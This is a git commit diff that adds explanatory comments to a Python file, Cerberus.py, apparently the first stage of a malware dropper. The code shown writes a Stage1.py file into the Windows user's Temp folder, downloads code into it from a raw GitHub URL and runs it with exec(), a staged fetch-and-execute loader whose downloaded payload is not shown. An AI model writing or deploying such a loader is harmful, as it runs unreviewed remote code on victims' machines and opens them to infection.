e8f21216f9ae70ca2913a89f98552c962651dd6b
Param Kudle <136839842+paramkudle@users.noreply.github.com>
2024-07-02 16:39:57 +0530

    Added Comments for Code Readability

--- Cerberus.py
+++ Cerberus.py
@@ -4,10 +4,13 @@ from bs4 import BeautifulSoup
 
 path = ("/Users/" + str(os.getlogin()) + "/AppData/Local/Temp/Stage1.py")
 
-if os.path.isfile(path) == False:
+if os.path.isfile(path) == False:   # Creates the Stage 1 File if it doesn't exist
     file = open('Stage1.py', 'a')
     file.close()
 
-urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage1Source.txt", path)
 
-exec(open(path).read())
+# Retrieves code from URL and appends it into Stage1 created earlier 
+urllib.request.urlretrieve("https://raw.githubusercontent.com/paramkudle/Cerberus/main/Stage1Source.txt", path)  
+
+# Runs the Stage1 file
+exec(open(path).read())  
